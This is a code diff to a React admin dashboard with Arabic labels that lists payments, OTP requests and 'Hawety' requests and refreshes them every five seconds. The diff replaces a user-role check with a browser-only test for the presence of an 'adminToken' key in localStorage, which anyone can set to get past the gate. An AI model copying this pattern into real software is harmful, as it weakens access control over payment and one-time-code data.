@@ -1,5 +1,7 @@
 import { useState, useEffect } from "react";
+import { useLocation } from "wouter";
 import { useAuth } from "@/_core/hooks/useAuth";
+import { Button } from "@/components/ui/button";
 
 interface Payment {
   id: number;
@@ -31,7 +33,9 @@ interface HawetyRequest {
 }
 
 export default function AdminDashboard() {
+  const [location, setLocation] = useLocation();
   const { user } = useAuth();
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [activeTab, setActiveTab] = useState("payments");
   const [payments, setPayments] = useState<Payment[]>([]);
   const [otpRequests, setOtpRequests] = useState<OTPRequest[]>([]);
@@ -39,11 +43,24 @@ export default function AdminDashboard() {
   const [hawetyRequests, setHawetyRequests] = useState<HawetyRequest[]>([]);
   const [loading, setLoading] = useState(false);
 
+  // Check authentication on mount
   useEffect(() => {
+    const adminToken = localStorage.getItem("adminToken");
+    if (!adminToken) {
+      setLocation("/admin-login");
+      return;
+    }
+    setIsAuthenticated(true);
+  }, [setLocation]);
+
+  // Fetch data when authenticated
+  useEffect(() => {
+    if (!isAuthenticated) return;
+
     fetchData();
     const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
     return () => clearInterval(interval);
-  }, []);
+  }, [isAuthenticated]);
 
   const fetchData = async () => {
     setLoading(true);
@@ -108,13 +125,18 @@ export default function AdminDashboard() {
     }
   };
 
-  // Check if user is admin
-  if (user?.role !== "admin") {
+  const handleLogout = () => {
+    localStorage.removeItem("adminToken");
+    localStorage.removeItem("adminUsername");
+    setLocation("/admin-login");
+  };
+
+  // Show loading while checking authentication
+  if (!isAuthenticated) {
     return (
-      <div className="flex items-center justify-center min-h-screen">
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
         <div className="text-center">
-          <h1 className="text-2xl font-bold text-red-600 mb-2">غير مصرح</h1>
-          <p className="text-gray-600">أنت لا تملك صلاحيات الوصول إلى لوحة التحكم</p>
+          <p className="text-gray-600">جاري التحقق...</p>
         </div>
       </div>
     );
@@ -123,7 +145,15 @@ export default function AdminDashboard() {
   return (
     <div className="min-h-screen bg-gray-50 p-4">
       <div className="max-w-7xl mx-auto">
-        <h1 className="text-3xl font-bold mb-8">لوحة التحكم</h1>
+        <div className="flex justify-between items-center mb-8">
+          <h1 className="text-3xl font-bold">لوحة التحكم</h1>
+          <Button
+            onClick={handleLogout}
+            className="bg-red-600 hover:bg-red-700 text-white"
+          >
+            تسجيل الخروج
+          </Button>
+        </div>
 
         {/* Tabs */}
         <div className="flex gap-4 mb-6 border-b">
